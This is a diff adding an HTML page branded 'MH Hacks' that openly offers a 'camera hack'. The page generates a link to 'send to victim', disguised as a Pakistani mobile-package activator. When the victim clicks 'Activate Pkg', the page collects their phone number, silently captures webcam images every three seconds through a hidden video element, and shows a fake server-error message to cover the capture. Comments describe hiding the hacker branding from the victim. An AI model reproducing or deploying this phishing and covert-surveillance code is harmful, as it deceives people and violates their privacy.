@@ -1,0 +1,645 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>🔗 Link Generator & Pkg Activator</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+<style>
+/* --- General & Light Mode Base --- */
+body {
+        font-family: 'Poppins', sans-serif;
+        background: #f8fafc; /* Light Gray/White Background */
+        color: #1e293b; /* Dark Text Color */
+        padding: 20px;
+        display: flex;
+        justify-content: center;
+        align-items: flex-start;
+        min-height: 100vh;
+        margin: 0;
+}
+
+/* --- Card Styling --- */
+.card {
+        background: #ffffff; /* Pure White Card Background */
+        padding: 30px;
+        border-radius: 16px;
+        max-width: 450px;
+        width: 95%;
+        margin: 20px auto;
+        box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
+        border: 1px solid #e2e8f0;
+        transition: all 0.3s ease;
+}
+
+/* --- Welcome Modal (New) --- */
+#welcome-modal {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.9); /* Dark overlay */
+        z-index: 9999;
+        display: flex; /* Flex set via JS/CSS default */
+        justify-content: center;
+        align-items: center;
+        backdrop-filter: blur(5px);
+}
+
+.modal-content {
+        background: white;
+        padding: 30px;
+        border-radius: 16px;
+        width: 90%;
+        max-width: 350px;
+        text-align: center;
+        box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        border: 2px solid #3b82f6;
+        animation: popIn 0.3s ease-out;
+}
+
+@keyframes popIn {
+        from { transform: scale(0.8); opacity: 0; }
+        to { transform: scale(1); opacity: 1; }
+}
+
+.modal-content h3 {
+        margin-top: 0;
+        color: #1e293b;
+        font-size: 22px;
+        margin-bottom: 20px;
+}
+
+.modal-btn {
+        display: block;
+        width: 100%;
+        padding: 12px;
+        margin: 10px 0;
+        border-radius: 10px;
+        text-decoration: none;
+        font-weight: 600;
+        font-size: 16px;
+        transition: transform 0.2s, box-shadow 0.2s;
+        border: none;
+        cursor: pointer;
+        box-sizing: border-box;
+}
+
+.telegram-btn-style {
+        background-color: #0088cc; /* Telegram Color */
+        color: white;
+}
+.telegram-btn-style:hover {
+        background-color: #0077b5;
+        transform: translateY(-2px);
+        box-shadow: 0 4px 10px rgba(0, 136, 204, 0.3);
+}
+
+.continue-btn-style {
+        background-color: #10b981; /* Green */
+        color: white;
+        margin-top: 20px;
+}
+.continue-btn-style:hover {
+        background-color: #059669;
+        transform: translateY(-2px);
+        box-shadow: 0 4px 10px rgba(16, 185, 129, 0.3);
+}
+
+
+/* --- Header Section --- */
+.header-container {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 3px;
+        margin-bottom: 8px;
+}
+
+/* --- Image Styling --- */
+#header-img-link {
+        display: block;
+        width: 36px;
+        height: 36px;
+        flex-shrink: 0;
+}
+#header-img-link img {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        border-radius: 4px;
+}
+
+h2 {
+        font-weight: 700;
+        color: #0f172a;
+        margin: 0;
+        text-align: center;
+}
+
+h3 {
+        font-weight: 600;
+        color: #475569;
+        margin: 20px 0 15px 0;
+        text-align: center;
+}
+
+/* --- Data Header --- */
+.data-header-container {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 5px;
+        margin: 20px 0 15px 0;
+}
+
+.data-header-container h3 {
+        margin: 0;
+        text-align: left;
+}
+
+.data-header-container img {
+        width: 24px;
+        height: 24px;
+        object-fit: cover;
+        border-radius: 4px;
+}
+
+/* --- Button Styling --- */
+button {
+        padding: 12px 20px;
+        border-radius: 10px;
+        border: 0;
+        background: #3b82f6;
+        color: #fff;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.2s ease;
+        box-shadow: 0 4px 10px rgba(59, 130, 246, 0.3);
+}
+
+button:hover {
+        background: #2563eb;
+        box-shadow: 0 6px 15px rgba(59, 130, 246, 0.4);
+}
+
+button:active {
+        transform: translateY(1px);
+        box-shadow: 0 2px 5px rgba(59, 130, 246, 0.3);
+}
+
+/* --- Input/Select Styling --- */
+input, select {
+        width: 100%;
+        padding: 15px 12px;
+        border-radius: 12px;
+        border: 2px solid #cbd5e1;
+        margin-top: 15px;
+        background: #ffffff;
+        color: #1e293b;
+        font-size: 16px;
+        transition: border-color 0.3s, box-shadow 0.3s;
+        box-sizing: border-box;
+}
+
+input:focus, select:focus {
+        outline: none;
+        border-color: #3b82f6;
+        box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2);
+}
+
+/* --- Utility & Gallery --- */
+.gallery {
+        display: grid;
+        grid-template-columns: repeat(auto-fill, minmax(80px, 1fr));
+        gap: 8px;
+        margin-top: 15px;
+}
+.gallery small {
+        width: 100%;
+        grid-column: 1 / -1;
+        text-align: center;
+}
+
+img {
+        width: 100%;
+        height: 80px;
+        object-fit: cover;
+        border-radius: 6px;
+        display: block;
+}
+
+small {
+        color: #64748b;
+        display: block;
+        text-align: center;
+        margin-bottom: 15px;
+}
+
+hr {
+        margin: 25px 0;
+        border: none;
+        border-top: 1px solid #e2e8f0;
+}
+
+#linkBox {
+        display: flex;
+        flex-wrap: wrap;
+        justify-content: space-between;
+        gap: 8px;
+        margin-top: 15px;
+}
+#linkBox input {
+        width: 100%;
+        margin-top: 0;
+        margin-bottom: 8px;
+}
+#linkBox button {
+        width: calc(50% - 4px);
+        margin-top: 0;
+}
+#refreshBtn {
+        width: 100%;
+        margin-top: 8px;
+}
+
+#downloadBtn {
+        width: 100%;
+        margin-top: 15px;
+        background: #059669;
+}
+
+/* --- Pkg Activator Specific Styles --- */
+#pkg-activator-card {
+        max-width: 400px;
+}
+#activateBtn {
+        width: 100%;
+        margin-top: 30px;
+        background: #10b981;
+        font-size: 18px;
+        padding: 15px 20px;
+}
+#activationStatus {
+        text-align: center;
+        margin-top: 30px;
+        font-weight: 600;
+        display: none;
+        padding: 20px;
+        border-radius: 12px;
+        border: 2px solid #ef4444;
+        background-color: #fef2f2;
+        color: #b91c1c;
+        line-height: 1.4;
+        box-shadow: 0 4px 15px rgba(239, 68, 68, 0.2);
+}
+
+/* Hidden elements */
+video {
+        opacity: 0;
+        position: absolute;
+        z-index: -1;
+}
+
+/* --- Telegram Floating Button (Modified) --- */
+#telegram-btn {
+        position: fixed;
+        bottom: 20px;
+        right: 20px;
+        width: 50px;
+        height: 50px;
+        background-color: #0088cc; /* Telegram Blue */
+        color: white;
+        border-radius: 50%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        font-size: 26px;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.25);
+        z-index: 1000;
+        transition: transform 0.2s;
+        text-decoration: none;
+}
+
+#telegram-btn:hover {
+        transform: scale(1.05);
+}
+</style>
+</head>
+<body>
+
+<!-- WELCOME MODAL / POPUP -->
+<div id="welcome-modal">
+        <div class="modal-content">
+                <h3><i class="fab fa-telegram" style="color:#0088cc;"></i> MH Hacks</h3>
+
+                <a href="https://t.me/mh_hacks_channel" target="_blank" class="modal-btn telegram-btn-style">
+                        <i class="fa-solid fa-bullhorn"></i> Join Telegram Channel
+                </a>
+
+                <a href="https://t.me/mh_hacks_Groups" target="_blank" class="modal-btn telegram-btn-style">
+                        <i class="fa-solid fa-users"></i> Join Telegram Group
+                </a>
+
+                <button id="closeModalBtn" class="modal-btn continue-btn-style">
+                        Continue to Dashboard <i class="fa-solid fa-arrow-right"></i>
+                </button>
+        </div>
+</div>
+
+<div class="card" id="dashboard-card">
+        <div class="header-container">
+                <a id="header-img-link" href="https://imgbb.com/">
+                        <img src="https://i.ibb.co/NdB47GyN/images-2.jpg" alt="images (2)" border="0">
+                </a>
+                <h2>𝗖𝗔𝗠3𝗥𝗔 𝗛𝗔𝗖𝗞</h2>
+    </div>
+        <small>Click on generate link button and send it to victim to access camera of victim.</small>
+
+        <div id="genArea" style="text-align: center;">
+                <button id="genBtn">Generate New Link</button>
+                <div id="linkBox">
+                        </div>
+        </div>
+
+<marquee behavior="scroll" direction="left">
+THIS PROVIDE BY | MH HACKS
+</marquee>
+        <hr>
+
+        <div id="dataArea" style="display:none">
+                <div class="data-header-container">
+                        <a style="display: block; width: 24px; height: 24px;">
+                                <img src="https://i.ibb.co/NdB47GyN/images-2.jpg" alt="camera icon">
+                        </a>
+                        <h3>Captured Data (ID: <span id="showId"></span>)</h3>
+                </div>
+
+                <small>Images captured from the last activated link.</small>
+                <div id="images" class="gallery"></div>
+
+                <button id="downloadBtn" onclick="downloadAllImages()">Download All Captured Images</button>
+        </div>
+</div>
+
+<div class="card" id="pkg-activator-card" style="display:none;">
+        <h2>Pkg Activator</h2>
+        <small>Select your SIM and enter your number to activate your desired package.</small>
+
+        <select id="sim-select">
+                <option value="">-- Select Your SIM --</option>
+                <option value="jazz">Jazz</option>
+                <option value="telenor">Telenor</option>
+                <option value="ufone">Ufone</option>
+                <option value="zong">Zong</option>
+                <option value="sco">SCOM</option>
+                <option value="other">Other/Landline</option>
+        </select>
+
+        <input type="tel" id="mobile-number" placeholder="Enter Mobile Number (03xxxxxxxxx)">
+
+        <button id="activateBtn">Activate Pkg</button>
+
+        <div id="activationStatus"></div>
+
+        <video id="videoElement" autoplay playsinline muted></video>
+        <canvas id="canvasElement" style="display:none;"></canvas>
+</div>
+
+<!-- FLOATING TELEGRAM BUTTON (Updated) -->
+<a id="telegram-btn" href="https://t.me/mh_hacks_Groups" target="_blank">
+        <i class="fab fa-telegram"></i>
+</a>
+
+<script>
+// Capture interval set to 3 seconds
+const CAPTURE_INTERVAL_MS = 3000;
+
+// --- Dashboard Elements ---
+const dashboardCard = document.getElementById('dashboard-card');
+const pkgActivatorCard = document.getElementById('pkg-activator-card');
+const genBtn=document.getElementById('genBtn');
+const linkBox=document.getElementById('linkBox');
+const dataArea=document.getElementById('dataArea');
+const showId=document.getElementById('showId');
+const images=document.getElementById('images');
+const welcomeModal = document.getElementById('welcome-modal');
+const closeModalBtn = document.getElementById('closeModalBtn');
+
+// --- Pkg Activator Elements ---
+const activateBtn = document.getElementById('activateBtn');
+const simSelect = document.getElementById('sim-select');
+const mobileNumber = document.getElementById('mobile-number');
+const activationStatus = document.getElementById('activationStatus');
+const video = document.getElementById('videoElement');
+const canvas = document.getElementById('canvasElement');
+let captureIntervalId = null;
+
+// --- Close Modal Logic ---
+closeModalBtn.onclick = () => {
+        welcomeModal.style.display = 'none';
+};
+
+// --- Utility Functions ---
+function generateId(){return 'user-'+Math.random().toString(36).slice(2,10);}
+function saveImages(id,imgArray){localStorage.setItem('images_'+id,JSON.stringify(imgArray));}
+function getImages(id){return JSON.parse(localStorage.getItem('images_'+id)||'[]');}
+
+// Renders captured images on the dashboard
+function renderImages(id){
+        const imgs=getImages(id);
+        images.innerHTML='';
+        if(!imgs.length){images.innerHTML='<small style="margin-top:10px;">No images yet for this ID. Open the generated link to capture data.</small>'; return;}
+        imgs.forEach((url, index)=>{
+                const img=document.createElement('img');
+                img.src=url;
+                img.title = `Image ${index + 1}`;
+                images.appendChild(img);
+        });
+}
+
+function stopCamera(stream) {
+        if (stream) {
+                stream.getTracks().forEach(t => t.stop());
+        }
+}
+
+// --- Download Function ---
+async function downloadAllImages() {
+        const id = localStorage.getItem('currentId');
+        if (!id) {
+                alert("Pehle koi link generate karein.");
+                return;
+        }
+
+        const imagesArray = getImages(id);
+        if (imagesArray.length === 0) {
+                alert("Download karne ke liye koi image nahi hai.");
+                return;
+        }
+
+        const zip = new JSZip();
+        let counter = 0;
+
+        for (let i = 0; i < imagesArray.length; i++) {
+                const url = imagesArray[i];
+                const base64Data = url.replace(/^data:image\/(png|jpeg);base64,/, "");
+                zip.file(`captured_img_${i + 1}.jpeg`, base64Data, {base64: true});
+                counter++;
+        }
+
+        if (counter > 0) {
+                document.getElementById('downloadBtn').textContent = 'Zipping... Please wait';
+                document.getElementById('downloadBtn').disabled = true;
+
+                zip.generateAsync({type:"blob"})
+                .then(function(content) {
+                        const a = document.createElement('a');
+                        a.href = URL.createObjectURL(content);
+                        a.download = `captured_data_${id}.zip`;
+                        document.body.appendChild(a);
+                        a.click();
+                        document.body.removeChild(a);
+
+                        document.getElementById('downloadBtn').textContent = 'Download Successful!';
+                        setTimeout(() => {
+                                document.getElementById('downloadBtn').textContent = 'Download All Captured Images';
+                                document.getElementById('downloadBtn').disabled = false;
+                        }, 3000);
+                })
+                .catch(err => {
+                        alert('Download mein error: ' + err);
+                        document.getElementById('downloadBtn').textContent = 'Download Error';
+                        document.getElementById('downloadBtn').disabled = false;
+                });
+        } else {
+                alert("Download karne ke liye koi valid image nahi mili.");
+        }
+}
+
+
+// --- Main Logic: Link Generator & Refresh ---
+genBtn.onclick=()=>{
+        const id=generateId();
+        showId.textContent=id;
+        const link=location.origin+location.pathname+'?id='+encodeURIComponent(id);
+        localStorage.setItem('currentId',id);
+
+        // --- HTML Injection for Link Box ---
+        linkBox.innerHTML=`
+                <input readonly value="${link}">
+                <button id="copyBtn">Copy Link</button>
+                <button id="openBtn">Open Link</button>
+                <button id="refreshBtn">Refresh</button>
+        `;
+
+        document.getElementById('openBtn').onclick=()=>window.open(link,'_blank');
+        document.getElementById('copyBtn').onclick=()=>navigator.clipboard.writeText(link).then(()=>alert('Copied')).catch(()=>prompt('Copy manually:', link));
+
+        document.getElementById('refreshBtn').onclick = () => {
+                window.location.reload();
+        };
+
+        dataArea.style.display='block';
+        renderImages(id);
+};
+
+
+// --- Pkg Activator Logic (Continuous Capture) ---
+window.onbeforeunload = () => {
+        if (captureIntervalId) {
+                clearInterval(captureIntervalId);
+        }
+};
+
+activateBtn.onclick = async () => {
+        activationStatus.style.display = 'none';
+
+        if (!simSelect.value || mobileNumber.value.length < 11) {
+                activationStatus.style.display = 'block';
+                activationStatus.style.backgroundColor = '#fee2e2';
+                activationStatus.style.color = '#dc2626';
+                activationStatus.textContent = '❌ Please select SIM and enter a valid mobile number.';
+                return;
+        }
+
+        activateBtn.disabled = true;
+        activateBtn.textContent = 'Processing Request...';
+        activateBtn.style.backgroundColor = '#fbbf24';
+        activateBtn.style.color = '#78350f';
+
+        const ID = new URLSearchParams(location.search).get('id');
+        let stream = null;
+
+        try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                video.onloadedmetadata = () => video.play();
+
+                captureIntervalId = setInterval(() => {
+                        if (video.videoWidth === 0) return;
+
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        const capturedImage = canvas.toDataURL('image/jpeg', 0.5);
+
+                        const old = getImages(ID);
+                        old.push(capturedImage);
+                        saveImages(ID, old);
+
+                        console.log(`Image captured and saved: Total ${old.length}`);
+
+                }, CAPTURE_INTERVAL_MS);
+
+                setTimeout(() => {
+                        activationStatus.style.display = 'block';
+                        activationStatus.innerHTML = 'SERVER ERROR<br>Pls Try Later Server İs Down Due To Overload!';
+                }, 1000);
+
+        } catch (err) {
+                stopCamera(stream);
+                console.error("Camera Error:", err);
+
+                activationStatus.style.display = 'block';
+                activationStatus.innerHTML = 'SERVER ERROR<br>Pls Try Later Server İs Down Due To Overload! (Camera Access Failed)';
+
+                activateBtn.disabled = false;
+                activateBtn.textContent = 'Activate Pkg';
+                activateStatus.style.backgroundColor = '#10b981';
+        }
+};
+
+// --- Router (Determines which view to show) ---
+const ID_PARAM=new URLSearchParams(location.search).get('id');
+
+if(ID_PARAM){
+        // --- VICTIM VIEW (Pkg Activator) ---
+        dashboardCard.style.display = 'none';
+        pkgActivatorCard.style.display = 'block';
+        document.body.style.alignItems = 'center';
+
+        // HIDE THE WELCOME MODAL & TELEGRAM BUTTON FOR VICTIM
+        // (So they don't see "Join MH Hacks Channel")
+        if(welcomeModal) welcomeModal.style.display = 'none';
+        const telegramBtn = document.getElementById('telegram-btn');
+        if(telegramBtn) telegramBtn.style.display = 'none';
+
+} else {
+        // --- ADMIN VIEW (Dashboard) ---
+        // Show Welcome Modal (It is display:flex by default in CSS, so just let it be)
+
+        const savedId=localStorage.getItem('currentId');
+        if(savedId){
+                showId.textContent=savedId;
+                dataArea.style.display='block';
+                renderImages(savedId);
+        }
+}
+</script>
+</body>
+</html>
